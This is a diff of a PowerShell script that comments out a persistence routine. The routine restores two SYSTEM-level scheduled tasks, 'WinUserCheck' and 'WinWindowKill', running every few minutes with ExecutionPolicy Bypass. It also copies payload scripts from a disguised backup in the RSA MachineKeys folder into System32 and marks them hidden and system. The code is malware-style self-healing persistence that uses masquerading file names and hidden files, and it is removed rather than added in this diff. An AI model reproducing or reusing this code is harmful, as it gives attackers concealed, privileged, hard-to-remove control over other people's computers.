@@ -27,42 +27,42 @@ try {
     }
 }
 
-#restore files that were in task scheduler
-$backupPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
-$restoreDir = "$env:windir\System32\Com\en-US"
+# #restore files that were in task scheduler
+# $backupPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
+# $restoreDir = "$env:windir\System32\Com\en-US"
 
-# --- Check and restore WinUserCheck ---
-$hasTask1 = $true
-$null = schtasks /Query /TN "WinUserCheck" 2>$null
-if ($LASTEXITCODE -ne 0) {
-    $hasTask1 = $false
-}
+# # --- Check and restore WinUserCheck ---
+# $hasTask1 = $true
+# $null = schtasks /Query /TN "WinUserCheck" 2>$null
+# if ($LASTEXITCODE -ne 0) {
+#     $hasTask1 = $false
+# }
 
-if (-not $hasTask1) {
-    Write-Host "[+] WinUserCheck task is missing — restoring..."
-    if (-not (Test-Path "$restoreDir\sys_usr.ps1")) {
-        Write-Host "[+] sys_usr.ps1 is missing — restoring from backup"
-        Copy-Item "$backupPath\win_ux.ps1" "$restoreDir\sys_usr.ps1" -Force
-        attrib +h +s "$restoreDir\sys_usr.ps1"
-    }
+# if (-not $hasTask1) {
+#     Write-Host "[+] WinUserCheck task is missing — restoring..."
+#     if (-not (Test-Path "$restoreDir\sys_usr.ps1")) {
+#         Write-Host "[+] sys_usr.ps1 is missing — restoring from backup"
+#         Copy-Item "$backupPath\win_ux.ps1" "$restoreDir\sys_usr.ps1" -Force
+#         attrib +h +s "$restoreDir\sys_usr.ps1"
+#     }
 
-    schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_usr.ps1`"" /RU SYSTEM
-}
+#     schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_usr.ps1`"" /RU SYSTEM
+# }
 
-# --- Check and restore WinWindowKill ---
-$hasTask2 = $true
-$null = schtasks /Query /TN "WinWindowKill" 2>$null
-if ($LASTEXITCODE -ne 0) {
-    $hasTask2 = $false
-}
+# # --- Check and restore WinWindowKill ---
+# $hasTask2 = $true
+# $null = schtasks /Query /TN "WinWindowKill" 2>$null
+# if ($LASTEXITCODE -ne 0) {
+#     $hasTask2 = $false
+# }
 
-if (-not $hasTask2) {
-    Write-Host "[+] WinWindowKill task is missing — restoring..."
-    if (-not (Test-Path "$restoreDir\sys_win.ps1")) {
-        Write-Host "[+] sys_win.ps1 is missing — restoring from backup"
-        Copy-Item "$backupPath\win_ui.ps1" "$restoreDir\sys_win.ps1" -Force
-        attrib +h +s "$restoreDir\sys_win.ps1"
-    }
+# if (-not $hasTask2) {
+#     Write-Host "[+] WinWindowKill task is missing — restoring..."
+#     if (-not (Test-Path "$restoreDir\sys_win.ps1")) {
+#         Write-Host "[+] sys_win.ps1 is missing — restoring from backup"
+#         Copy-Item "$backupPath\win_ui.ps1" "$restoreDir\sys_win.ps1" -Force
+#         attrib +h +s "$restoreDir\sys_win.ps1"
+#     }
 
-    schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_win.ps1`"" /RU SYSTEM
-}
+#     schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_win.ps1`"" /RU SYSTEM
+# }
